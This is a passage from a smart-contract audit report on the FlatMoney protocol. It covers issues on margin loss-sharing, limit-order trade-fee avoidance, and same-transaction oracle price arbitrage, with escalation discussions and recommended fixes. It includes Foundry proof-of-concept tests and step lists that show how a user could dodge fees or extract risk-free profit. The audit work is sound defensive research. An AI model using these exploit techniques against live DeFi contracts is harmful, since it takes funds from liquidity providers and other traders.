However, that is different from this report where the long traders are unable to withdraw when the price goes up significantly.

These are two separate issues, and the root causes are different. The reason why the FlatCoin's value can go to zero is due to the design of the protocol where the short side can lose to the long side. However, this report and its duplicated reports highlighted a bug in the existing implementation that could lead to long traders being unable to withdraw.



**nevillehuang**

> I think this is a fair assumption to have these values set so that other positions will practically never go into negative values – so this bug will practically never be triggered. Hence, the assumptions for this issue to be triggered are quite extensive.
> 
> Planning to accept the escalation and consider this issue a Medium severity one.

Agree to downgrade to medium severity based on dependency of large price increases.

**Czar102**

Based on https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/196#issuecomment-1970315654, still planning to consider this a valid Medium.

**Czar102**

Result:
Medium
Has duplicates

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [ydspa](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/196/#issuecomment-1955885947): accepted

# Issue H-13: Losses of some long traders can eat into the margins of others 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/198 

## Found by 
xiaoming90
## Summary

The losses of some long traders can eat into the margins of others, resulting in those affected long traders being unable to withdraw their margin and profits, leading to a loss of assets for the long traders.

## Vulnerability Detail

At $T0$, the current price of ETH is \$1000 and assume the following state:

| Alice's Long Position 1                                     | Bob's Long Position 2                                       | Charles (LP)     |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ---------------- |
| Position Size = 6 ETH<br />Margin = 3 ETH<br />Last Price (entry price) = \$1000 | Position Size = 6 ETH<br />Margin = 5 ETH<br />Last Price (entry price) = \$1000 | Deposited 12 ETH |

- The `stableCollateralTotal` will be 12 ETH
- The `GlobalPositions.marginDepositedTotal` will be 8 ETH (3 + 5)
- The `globalPosition.sizeOpenedTotal` will be 12 ETH (6 + 6)
- The total balance of ETH in the vault is 20 ETH. 


As this is a perfectly hedged market, the accrued fee will be zero, and ignored in this report for simplicity's sake.

At $T1$, the price of the ETH drops from \$1000 to \$600. At this point, the settle margin of both long positions will be as follows:

| Alice's Long Position 1                                     | Bob's Long Position 2                                       |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| priceShift = Current Price - Last Price = \$600 - \$1000 = -\$400<br />PnL = (Position Size * priceShift) / Current Price = (6 ETH * -\$400) / \$400 = -4 ETH<br />settleMargin = marginDeposited + PnL = 3 ETH + (-4 ETH) = -1 ETH | PnL = -4 ETH (Same calculation)<br />settleMargin = marginDeposited + PnL = 5 ETH + (-4 ETH) = 1 ETH |

Alice's long position is underwater (settleMargin < 0), so it can be liquidated. When the liquidation is triggered, it will internally call the `updateGlobalPositionData` function. Even if the liquidation does not occur, any of the following actions will also trigger the `updateGlobalPositionData` function internally:

- executeOpen
- executeAdjust
- executeClose

The purpose of the `updateGlobalPositionData` function is to update the global position data. This includes getting the total profit loss of all long traders (Alice & Bob), and updating the margin deposited total + stable collateral total accordingly.

Assume that the `updateGlobalPositionData` function is triggered by one of the above-mentioned functions. Line 179 below will compute the total PnL of all the opened long positions.

```solidity
priceShift = current price - last price
priceShift = $600 - $1000 = -$400

profitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / current price
profitLossTotal = (12 ETH * -$400) / $600
profitLossTotal = -8 ETH
```

The `profitLossTotal` is -8 ETH. This is aligned with what we have calculated earlier, where Alice's PnL is -4 ETH and Bob's PnL is -4 ETH (total = -8 ETH loss). 

At Line 184 below, the `newMarginDepositedTotal` will be set to as follows (ignoring the `_marginDelta` for simplicity's sake)

```solidity
newMarginDepositedTotal = _globalPositions.marginDepositedTotal + _marginDelta + profitLossTotal
newMarginDepositedTotal = 8 ETH + 0 + (-8 ETH) = 0 ETH
```

What happened above is that 8 ETH collateral is deducted from the long traders and transferred to LP. When `newMarginDepositedTotal` is zero, this means that the long trader no longer owns any collateral. This is incorrect, as Bob's position should still contribute 1 ETH remaining margin to the long trader's pool.

Let's review Alice's Long Position 1: Her position's settled margin is -1 ETH. When the settled margin is -ve then the LPs have to bear the cost of loss per the comment [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L139). However, in this case, we can see that it is Bob (long trader) instead of LPs who are bearing the cost of Alice's loss, which is incorrect.

Let's review Bob's Long Position 2: His position's settled margin is 1 ETH. If his position's liquidation margin is $LM$, Bob should be able to withdraw $1\  ETH - LM$ of his position's margin. However, in this case, the `marginDepositedTotal` is already zero, so there is no more collateral left on the long trader pool for Bob to withdraw, which is incorrect.

With the current implementation, the losses of some long traders can eat into the margins of others, resulting in those affected long traders being unable to withdraw their margin and profits.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L173

```solidity
being File: FlatcoinVault.sol
173:     function updateGlobalPositionData(
174:         uint256 _price,
175:         int256 _marginDelta,
176:         int256 _additionalSizeDelta
177:     ) external onlyAuthorizedModule {
178:         // Get the total profit loss and update the margin deposited total.
179:         int256 profitLossTotal = PerpMath._profitLossTotal({globalPosition: _globalPositions, price: _price});
180: 
181:         // Note that technically, even the funding fees should be accounted for when computing the margin deposited total.
182:         // However, since the funding fees are settled at the same time as the global position data is updated,
183:         // we can ignore the funding fees here.
184:         int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _marginDelta + profitLossTotal;
185: 
186:         // Check that the sum of margin of all the leverage traders is not negative.
187:         // Rounding errors shouldn't result in a negative margin deposited total given that
188:         // we are rounding down the profit loss of the position.
189:         // If anything, after closing the last position in the system, the `marginDepositedTotal` should can be positive.
190:         // The margin may be negative if liquidations are not happening in a timely manner.
191:         if (newMarginDepositedTotal < 0) {
192:             revert FlatcoinErrors.InsufficientGlobalMargin();
193:         }
194: 
195:         _globalPositions = FlatcoinStructs.GlobalPositions({
196:             marginDepositedTotal: uint256(newMarginDepositedTotal),
197:             sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),
198:             lastPrice: _price
199:         });
200: 
201:         // Profit loss of leverage traders has to be accounted for by adjusting the stable collateral total.
202:         // Note that technically, even the funding fees should be accounted for when computing the stable collateral total.
203:         // However, since the funding fees are settled at the same time as the global position data is updated,
204:         // we can ignore the funding fees here
205:         _updateStableCollateralTotal(-profitLossTotal);
206:     }
```

## Impact

Loss of assets for the long traders as the losses of some long traders can eat into the margins of others, resulting in those affected long traders being unable to withdraw their margin and profits.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L173

## Tool used

Manual Review

## Recommendation

The following are the two issues identified earlier and the recommended fixes:

**Issue 1**

> Let's review Alice's Long Position 1: Her position's settled margin is -1 ETH. When the settled margin is -ve then the LPs have to bear the cost of loss per the comment [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L139). However, in this case, we can see that it is Bob (long trader) instead of LPs who are bearing the cost of Alice's loss, which is incorrect.

Fix: Alice -1 ETH loss should be borne by the LP, not the long traders. The stable collateral total of LP should be deducted by 1 ETH to bear the cost of the loss.

**Issue 2**

> Let's review Bob's Long Position 2: His position's settled margin is 1 ETH. If his position's liquidation margin is $LM$, Bob should be able to withdraw $1\  ETH - LM$ of his position's margin. However, in this case, the `marginDepositedTotal` is already zero, so there is no more collateral left on the long trader pool for Bob to withdraw, which is incorrect.

Fix: Bob should be able to withdraw $1\  ETH - LM$ of his position's margin regardless of the PnL of other long traders. Bob's margin should be isolated from Alice's loss.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: high(7)



**0xLogos**

Escalate 

Invalid (maybe medium if I'm missing something, clearly not high)

Isn't described scenario is just a speculation? Why Alice's long position was not liquidated earlier? Even if price dropped that significant in ~1 minute there is still enough time to liquidate.

**sherlock-admin2**

> Escalate 
> 
> Invalid (maybe medium if I'm missing something, clearly not high)
> 
> Isn't described scenario is just a speculation? Why Alice's long position was not liquidated earlier? Even if price dropped that significant in ~1 minute there is still enough time to liquidate.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**securitygrid**

The judge should consider whether the scenario or the assumed system state (the value of some variables) described in a report will actually occur or not. This is important.

The scenario described in this report is unlikely to occur. Because Alice's position should have been liquidated before T1, why did it have to wait until bad debts occurred before it was liquidated?
If the protocol has only one keeper, then such a scenario may occur when the keeper goes down. However, the protocol has multiple keepers: from third parties and from the protocol itself. It is impossible for all keepers going down.

**xiaoming9090**

The issue stands valid and remains high as it leads to a loss of assets for the long traders, as described in the "impact" section of the report. 

The scenario is a valid example to demonstrate the issue on hand. The points related to the timing of the liquidation in the escalation are irrelevant, as the bugs will be triggered when liquidation is executed.

Also, we cannot expect the liquidator keeper always to liquidate the accounts before the settled margin falls below zero (bad debt) under all circumstances due to many reasons (e.g., the price dropped too fast, delay due to too many TX queues at sequencer, time delay between the oracle and market price)

The scenario where the settled margin falls below zero (bad debt) is absolutely something that will happen in the real world. In the code of the liquidation function [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LiquidationModule.sol#L139), even the protocol expected that the settled margin could fall below zero (bad debt) under some conditions and implement logic to handle this scenario.

```solidity
// If the settled margin is -ve then the LPs have to bear the cost.
// Adjust the stable collateral total to account for user's profit/loss and the negative margin.
// Note: We are adding `settledMargin` and `profitLoss` instead of subtracting because of their sign (which will be -ve).
vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
```

#

**Czar102**

Would like sponsors to comment on this issue @D-Ig @itsermin @rashtrakoff – is it unintended?
@nevillehuang any thoughts?

Given that this occurs on accrual of bad debt, I think it should be classified at most as a Medium severity issue.

**rashtrakoff**

The old math (that is math being used in the audit version of contracts) had this side effect. The new math fixes this along with other issues.

**Czar102**

Thank you @rashtrakoff.

Planning to accept the escalation and consider this a Medium severity issue.

**nevillehuang**

> Thank you @rashtrakoff.
> 
> Planning to accept the escalation and consider this a Medium severity issue.

Agree to downgrade to medium severity

**Czar102**

Result:
Medium
Unique

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [0xLogos](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/198/#issuecomment-1956807320): accepted

**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/266.

# Issue H-14: Trade fees can be avoided in limit orders 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/212 

## Found by 
0xLogos, LTDingZhen, jennifer37, nobody2018, santipu\_, shaka
## Summary

On limit order announcement the trade fee is calculated based on the current size of the position and its value is used on the execution of the limit order. However, it is not taken into account that the value of `additionalSize` in the position can have changed since the limit order was announced, so users can avoid paying trade fees for closing leveraged positions at the expense of LPs.

## Vulnerability Detail

When a user announces a limit order to close a leveraged position the trade fee [is calculated](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L62-L64) based on the current trade fee rate and the `additionalSize` of the position and [stored](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L69) in the `_limitOrderClose` mapping.

On the execution of the limit order, the value of the trade fee recorded in the `_limitOrderClose` mapping is [used to build the `AnnoundedLeverageClose` struct](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L166-L172) that is sent to the `LeverageModule:executeClose` function. In this function the trade fee is [used to pay the stable LPs](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L310) and [subtracted from the total amount](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L314) received by the user closing the position.

However, it is not taken into account that the value of `additionalSize` in the position can have changed since the limit order was announced [via the `LeverageModule:executeAdjust` function](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L196).

As a result, users that want to open a limit order can do so using the minimum `additionalSize` possible and then increase it after the limit order is announced, avoiding paying the trade fee for the additional size adjustment.

It is also worth mentioning that the trade fee rate can change between the announcement and the execution of the limit order, so the trade fee calculated at the announcement time can be different from the one used at the execution time. Although this scenario is much less likely to happen (requires the governance to change the trade fee rate) and its impact is much lower (the trade fee rate is not likely to change significantly).


## Impact

Users can avoid paying trade fees for closing leveraged positions at the expense of UNIT LPs, that should have received the trade fee.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L62-L64

## Proof of concept

<details>

<summary>Tests</summary>

The following tests show the example of a user that opens a limit order to be executed when the price doubles. 

The operations performed in both tests are identical, but the order of the operations is different, so we can see how a user can exploit the system to avoid paying trade fees.

To reproduce it add the following code to `AdjustPositionTest` contract and run `forge test --mt test_LimitTradeFee -vv`:

```solidity
    function test_LimitTradeFee_ExpectedBehaviour() public {
        uint256 aliceCollateralBalanceBefore = WETH.balanceOf(alice);
        uint256 collateralPrice = 1000e8;

        announceAndExecuteDeposit({
            traderAccount: bob,
            keeperAccount: keeper,
            depositAmount: 10000e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Create small leverage position
        uint256 initialMargin = 0.05e18;
        uint256 initialSize = 0.1e18;
        uint256 tokenId = announceAndExecuteLeverageOpen({
            traderAccount: alice,
            keeperAccount: keeper,
            margin: initialMargin,
            additionalSize: initialSize,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Increase margin and size in position
        uint256 adjustmentTradeFee = announceAndExecuteLeverageAdjust({
            tokenId: tokenId,
            traderAccount: alice,
            keeperAccount: keeper,
            marginAdjustment: 100e18,
            additionalSizeAdjustment: 2400e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Anounce limit order to close position at 2x price
        vm.startPrank(alice);
        limitOrderProxy.announceLimitOrder({
            tokenId: tokenId,
            priceLowerThreshold: 0,
            priceUpperThreshold: collateralPrice * 2
        });

        // Collateral price doubles after 1 month and the order is executed
        skip(4 weeks);
        collateralPrice = collateralPrice * 2;
        setWethPrice(collateralPrice);
        bytes[] memory priceUpdateData = getPriceUpdateData(collateralPrice);
        vm.startPrank(keeper);
        limitOrderProxy.executeLimitOrder{value: 1}(tokenId, priceUpdateData);

        uint256 aliceCollateralBalanceAfter = WETH.balanceOf(alice);
        console2.log("profit:", aliceCollateralBalanceAfter - aliceCollateralBalanceBefore);
    }

    function test_LimitTradeFee_PayLessFees() public {
        uint256 aliceCollateralBalanceBefore = WETH.balanceOf(alice);
        uint256 collateralPrice = 1000e8;

        announceAndExecuteDeposit({
            traderAccount: bob,
            keeperAccount: keeper,
            depositAmount: 10000e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Create small leverage position
        uint256 initialMargin = 0.05e18;
        uint256 initialSize = 0.1e18;
        uint256 tokenId = announceAndExecuteLeverageOpen({
            traderAccount: alice,
            keeperAccount: keeper,
            margin: initialMargin,
            additionalSize: initialSize,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Anounce limit order to close position at 2x price
        vm.startPrank(alice);
        limitOrderProxy.announceLimitOrder({
            tokenId: tokenId,
            priceLowerThreshold: 0,
            priceUpperThreshold: collateralPrice * 2
        });

        // Increase margin and size in position
        uint256 adjustmentTradeFee = announceAndExecuteLeverageAdjust({
            tokenId: tokenId,
            traderAccount: alice,
            keeperAccount: keeper,
            marginAdjustment: 100e18,
            additionalSizeAdjustment: 2400e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Collateral price doubles after 1 month and the order is executed
        skip(4 weeks);
        collateralPrice = collateralPrice * 2;
        setWethPrice(collateralPrice);
        bytes[] memory priceUpdateData = getPriceUpdateData(collateralPrice);
        vm.startPrank(keeper);
        limitOrderProxy.executeLimitOrder{value: 1}(tokenId, priceUpdateData);

        uint256 aliceCollateralBalanceAfter = WETH.balanceOf(alice);
        console2.log("profit:", aliceCollateralBalanceAfter - aliceCollateralBalanceBefore);
    }
```

</details>


<details>

<summary>Result</summary>

```js
[PASS] test_LimitTradeFee_ExpectedBehaviour() (gas: 2457623)
Logs:
  profit: 1195246800000000000000

[PASS] test_LimitTradeFee_PayLessFees() (gas: 2441701)
Logs:
  profit: 1197646800000000000000

Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 21.23ms
```

As we can see, in the second case the user was able to get a profit 2.4 rETH higher, corresponding to the trade fee avoided for the additional size adjustment done after creating the limit order (2,400 rETH * 0.1% fee). That higher profit has come at the expense of LPs, who should have received the trade fee.

</details>

## Tool used

Manual Review

## Recommendation

Calculate the trade fee at the execution time of the limit order, in the same way it is done for stable withdrawals for the withdrawal fee.

```diff
File: LimitOrder.sol

+       uint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(
+           vault.getPosition(tokenId).additionalSize
+       );
+
        order.orderData = abi.encode(
            FlatcoinStructs.AnnouncedLeverageClose({
                tokenId: tokenId,
                minFillPrice: minFillPrice,
-               tradeFee: _limitOrder.tradeFee
+               tradeFee: tradeFee
            })
        );
```

A `maxTradeFee` parameter can also be added at the announcement time to avoid the trade fee being higher than a certain value.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: 



**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/274.

**ydspa**

Escalate

Fee loss in certain circumstance is a Medium issue

**sherlock-admin2**

> Escalate
> 
> Fee loss in certain circumstance is a Medium issue

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**xiaoming9090**

Escalate.

The impact of this issue is that the LPs will not receive the trade fee. This is similar to other issues where the protocol did not receive their entitled trade fee due to some error and should be categorized as loss of fee OR loss of earning, and thus should be a Medium.

Also, note that the LPs gain/earn when the following event happens:

- Loss of the long trader. This is because LP is the short side. The loss of a long trader is the gain of a short trader.
- Open, adjust, close long position - (0.1% fee)
- Open limit order - (0.1% fee)
- Borrow Rate Fees (aka Funding Rate)
- Liquidation Fees
- ETH Staking Yield

Statically, the bulk of the LP gain comes from the loss of the long trader in such a long-short prep protocol in the real world. The uncollected trading fee due to certain malicious users opening limit orders only makes up a very small portion of the earnings and does not materially impact the LPs or protocols. Also, this is not a bug that would drain the protocol, directly steal the assets of LPs, or lead to the protocol being insolvent. Thus, this issue should not be High. A risk rating of Medium would be more appropriate in this case.

**sherlock-admin2**

> Escalate.
> 
> The impact of this issue is that the LPs will not receive the trade fee. This is similar to other issues where the protocol did not receive their entitled trade fee due to some error and should be categorized as loss of fee OR loss of earning, and thus should be a Medium.
> 
> Also, note that the LPs gain/earn when the following event happens:
> 
> - Loss of the long trader. This is because LP is the short side. The loss of a long trader is the gain of a short trader.
> - Open, adjust, close long position - (0.1% fee)
> - Open limit order - (0.1% fee)
> 
> Statically, the bulk of the LP gain comes from the loss of the long trader in such a long-short prep protocol in the real world. The uncollected trading fee due to certain malicious users opening limit orders only makes up a very small portion of the earnings and does not materially impact the LPs or protocols. Also, this is not a bug that would drain the protocol, directly steal the assets of LPs, or lead to the protocol being insolvent. Thus, this issue should not be High. A risk rating of Medium would be more appropriate in this case.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**nevillehuang**

I think I agree with medium and @xiaoming9090 analysis, my initial thoughts were that fees make up a core part of the LPs earnings and should never be allowed to be side stepped. 

I want to note though if this can be performed repeatedly by an user grieving fees for a LP, wouldn't it be meeting the following criteria? But depending on what is deemed as material loss of funds for sherlock, I will let @Czar102 decide on severity, but I can agree with medium severity.

> Definite loss of funds without (extensive) limitations of external conditions



**0xjuaan**

To counter @xiaoming9090 's analysis (for this issue and also for issue #75) - 

> Statically, the bulk of the LP gain comes from the loss of the long trader in such a long-short prep protocol in the real world.

Is the above really true? Since the protocol is designed to be delta neutral, the expected PnL from the above avenue would be zero. LPs cant affect whether traders win or lose.
However, the trading fee is the only feature that guarantees some gains for the LPs, and with users bypassing this- LPs are much less incentivised to participate. 

Because of the above, I think that fees still make up a core part of the LPs earnings, but you can correct me if I am wrong.


 

**xiaoming9090**

I have updated my original escalation with a more comprehensive list of avenues from which the LPs earn their yield, so that the judge can have a more complete picture.

**shaka0x**

> Also, note that the LPs gain/earn when the following event happens:
> 
> * Loss of the long trader. This is because LP is the short side. The loss of a long trader is the gain of a short trader.
> * Open, adjust, close long position - (0.1% fee)
> * Open limit order - (0.1% fee)
> * Borrow Rate Fees (aka Funding Rate)
> * Liquidation Fees
> * ETH Staking Yield
>
> Statically, the bulk of the LP gain comes from the loss of the long trader in such a long-short prep protocol in the real world.

I respectfully disagree. The position of the UNIT holders will not always be short, and even the when they are the long trader might not necessarily have losses. 

The sponsor clarified this in a [Discord message](https://discord.com/channels/812037309376495636/1199005620536356874/1199695736430927902), regarding the comment regarding the LSD yield as a source of yield for UNIT holders:

```
The LSD yield is a little more complex because UNIT holders are technically long and short rETH. 
```

And [confirmed](https://discord.com/channels/812037309376495636/1199005620536356874/1199681390829125674) that the sources of UNIT yield come from funding rate, trading fees and liquidations.

```
UNIT is delta neutral. But yield is earned from:
1. Funding rate (which is historically usually being paid to the short positions). Ie. Leverage long traders are typically happy to pay a funding fee to shorts (but not always the case). This goes to UNIT holders or is paid by UNIT holders if funding rate is negative
2. Trading fees on each trade
3. Liquidation remaining margin when leverage traders get liquidated
```

Thus, the trade fees are a fundamental incentive for the UNIT holders.


**Czar102**

Not being able to gather protocol fees is a Medium severity issue as there is no loss of funds.

In this case though, I think High severity is justified, because the fee is what LPs are paid for traders to trade against, and there are value extraction strategies like multi-block #216 if the market is giving any additional information than the oracle states (always).
It's like selling an option, but not receiving the premium. This is a severe loss of funds, even though the notional wasn't impacted.

Is my way of thinking about this issue accurate? If yes, planning to reject the escalations and leave the issue as is.

**Czar102**

Result:
High
Has duplicates

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [ydspa](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/212/#issuecomment-1955898121): rejected
- [xiaoming9090](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/212/#issuecomment-1959561951): rejected

# Issue H-15: Oracle can return different prices in same transaction 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/216 

## Found by 
shaka
## Summary

The Pyth network oracle contract allows to submit and read two different prices in the same transaction. This can be used to create arbitrage opportunities that can make a profit with no risk at the expense of users on the other side of the trade.

## Vulnerability Detail

`OracleModule.sol` uses Pyth network as the primary source of price feeds. This oracle works in the following way:

- A dedicated network keeps track of the latest price consensus, together with the timestamp.
- This data is queried off-chain and submitted to the on-chain oracle.
- It is checked that the data submitted is valid and the new price data is stored.
- New requests for the latest price will now return the data submitted until a more recent price is submitted.

One thing to note is that the Pyth network is constantly updating the latest price (every 400ms), so when a new price is submitted on-chain it is not necessary that the price is the latest one. Otherwise, the process of querying the data off-chain, building the transaction, and submitting it on-chain would be required to be done with a latency of less than 400ms, which is not feasible. This makes it possible to submit two different prices in the same transaction and, thus, fetch two different prices in the same transaction.

This can be used to create some arbitrage opportunities that can make a profit with no risk. 

### How this can be exploited

An example of how this can be exploited, and showed in the PoC, would be:
- Create a small leverage position.
- Announce an adjustment order to increase the size of the position by some amount.
- In the same block, announce a limit close order.
- After the minimum execution time has elapsed, retrieve two prices from the Pyth oracle where the second price is higher than the first one.
- Execute the adjustment order sending the first price.
- Execute the limit close order sending the second price.

The result is approximately a profit of

```shell
adjustmentSize * (secondPrice - firstPrice) - (adjustmentSize * tradeFees * 2)
```

> Note: For simplicity, we do not take into account the initial size of the position, which in any case can be insignificant compared to the adjustment size. The keeper fee is also not included, as is the owner of the position that is executing the orders.

The following things are required to make a profit out of this attack:
- Submit the orders before other keepers. This can be easily achieved, as there are not always enough incentives to execute the orders as soon as possible.
- Obtain a positive delta between two prices in the time frame where the orders are executable that is greater than twice the trade fees. This can be very feasible, especially in moments of high volatility. Note also, that this requirement can be lowered to a delta greater than once the trade fees if we take into account that there is currently [another vulnerability](https://github.com/sherlock-audit/2023-12-flatmoney-shaka0x/issues/2) that allows to avoid paying fees for the limit order.

In the case of not being able to obtain the required delta or observing that a keeper has already submitted a transaction to execute them before the delta is obtained, the user can simply cancel the limit order and will have just the adjustment order executed.

Another possible strategy would pass through the following steps:
- Create a leverage position.
- Announce another leverage position with the same size.
- In the same block, announce a limit close order.
- After the minimum execution time has elapsed, retrieve two prices from the Pyth oracle where the second price is lower than the first one.
- Execute the limit close order sending the first price.
- Execute the open order sending the second price.

The result in this case is having a position with the same size as the original one, but having either lowered the `position.lastPrice` or getting a profit from the original position, depending on how the price has moved since the original position was opened.

## Proof of concept

<details>

<summary>Pyth network multiple submissions</summary>

We can find proof that it is possible to submit and read two different prices in the same transaction [here](https://basescan.org/tx/0x0e0c22e5996ae58bbff806eba6d51e8fc773a3598ef0e0a359432e08f0b51b95). In this transaction `updatePriceFeeds` is called with two different prices. After each call the current price is fetched and an event is emitted with the price and timestamp received. As we can see, the values fetched are different for each query of the price.

```js
Address 0x8250f4af4b972684f7b336503e2d6dfedeb1487a
Name    PriceFeedUpdate (index_topic_1 bytes32 id, uint64 publishTime, int64 price, uint64 conf)
Topics  0 0xd06a6b7f4918494b3719217d1802786c1f5112a6c1d88fe2cfec00b4584f6aec
        1 FF61491A931112DDF1BD8147CD1B641375F79F5825126D665480874634FD0ACE
Data    publishTime: 1706358779
        price: 226646416525
        conf: 115941591

Address 0xbf668dadb9cb8934468fcba6103fb42bb50f31ec
Topics  0 0x734558db0ee3a7f77fb28b877f9d617525904e6dad1559f727ec93aa06370866
Data    226646416525
        1706358779

Address 0x8250f4af4b972684f7b336503e2d6dfedeb1487a
Name    PriceFeedUpdate (index_topic_1 bytes32 id, uint64 publishTime, int64 price, uint64 conf)View Source
Topics  0 0xd06a6b7f4918494b3719217d1802786c1f5112a6c1d88fe2cfec00b4584f6aec
        1 FF61491A931112DDF1BD8147CD1B641375F79F5825126D665480874634FD0ACE
Data    publishTime: 1706358790
        price: 226649088828
        conf: 119840116

Address 0xbf668dadb9cb8934468fcba6103fb42bb50f31ec
Topics  0 0x734558db0ee3a7f77fb28b877f9d617525904e6dad1559f727ec93aa06370866
Data    226649088828
        1706358790
```

</details>

<details>

<summary>Arbitrage example</summary>

Add the following function to the `OracleTest` contract and run `forge test --mt testMultiplePricesInSameTx -vv`:

```solidity
function testMultiplePricesInSameTx() public {
        // Setup
        vm.startPrank(admin);
        leverageModProxy.setLevTradingFee(0.001e18); // 0.1%
        uint256 collateralPrice = 1000e8;
        setWethPrice(collateralPrice);
        announceAndExecuteDeposit({
                traderAccount: bob,
                keeperAccount: keeper,
                depositAmount: 10000e18,
                oraclePrice: collateralPrice,
                keeperFeeAmount: 0
        });
        uint256 aliceCollateralBalanceBefore = WETH.balanceOf(alice);

        // Create small leverage position
        uint256 initialMargin = 0.05e18;
        uint256 initialSize = 0.1e18;
        uint256 tokenId = announceAndExecuteLeverageOpen({
                traderAccount: alice,
                keeperAccount: keeper,
                margin: initialMargin,
                additionalSize: initialSize,
                oraclePrice: collateralPrice,
                keeperFeeAmount: 0
        });

        // Announce leverage adjustment
        announceAdjustLeverage({
                traderAccount: alice,
                tokenId: tokenId,
                marginAdjustment: 100e18,
                additionalSizeAdjustment: 2400e18,
                keeperFeeAmount: 0
        });

        // Anounce limit order in the same block
        vm.startPrank(alice);
        limitOrderProxy.announceLimitOrder({
                tokenId: tokenId,
                priceLowerThreshold: 0,
                priceUpperThreshold: 1 // executable at any price
        });

        // Wait for the orders to be executable
        skip(vaultProxy.minExecutabilityAge());
        bytes[] memory priceUpdateData1 = getPriceUpdateData(collateralPrice);
        // Price increases slightly after one second
        skip(1);
        bytes[] memory priceUpdateData2 = getPriceUpdateData(collateralPrice + 1.2e8);

        // Execute the adjustment with the lower price and the limit order with the higher price
        delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateData1);
        limitOrderProxy.executeLimitOrder{value: 1}(tokenId, priceUpdateData2);

        uint256 aliceCollateralBalanceAfter = WETH.balanceOf(alice);
        if (aliceCollateralBalanceAfter < aliceCollateralBalanceBefore) {
                console2.log("loss: %s", aliceCollateralBalanceBefore - aliceCollateralBalanceAfter);
        } else {
                console2.log("profit: %s", aliceCollateralBalanceAfter - aliceCollateralBalanceBefore);
        }
}
```

Console output:

```js
[PASS] testMultiplePricesInSameTx() (gas: 2351256)
Logs:
  profit: 475467998401917697

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.67ms
```
</details>

## Impact

Different oracle prices can be fetched in the same transaction, which can be used to create arbitrage opportunities that can make a profit with no risk at the expense of users on the other side of the trade.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L69

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L167

## Tool used

Manual Review

## Recommendation

```diff
File: OracleModule.sol
    FlatcoinStructs.OffchainOracle public offchainOracle; // Offchain Pyth network oracle

+   uint256 public lastOffchainUpdate;

    (...)

    function updatePythPrice(address sender, bytes[] calldata priceUpdateData) external payable nonReentrant {
+       if (lastOffchainUpdate >= block.timestamp) return;
+       lastOffchainUpdate = block.timestamp;
+
        // Get fee amount to pay to Pyth
        uint256 fee = offchainOracle.oracleContract.getUpdateFee(priceUpdateData);
```



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid



**sherlock-admin**

